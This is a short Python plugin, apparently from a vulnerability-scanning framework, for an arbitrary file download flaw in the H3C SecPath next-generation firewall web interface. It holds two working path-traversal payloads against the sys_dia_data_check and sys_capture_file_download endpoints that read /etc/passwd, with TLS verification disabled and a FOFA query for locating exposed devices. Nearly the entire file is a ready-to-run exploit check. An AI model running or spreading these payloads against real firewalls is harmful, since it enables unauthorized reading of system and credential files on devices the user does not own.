#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/H3C/H3C SecPath下一代防火墙 sys_dia_data_check 任意文件下载漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'H3C SecPath下一代防火墙 sys_dia_data_check 任意文件下载',

      'level'     :   'medium',

      'FOFA'      :   'title="Web user login"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/webui/?g=sys_dia_data_check&file_name=../../etc/passwd','/webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd']
  url1 = url + targets[0]
  url2 = url + targets[1]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url1
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret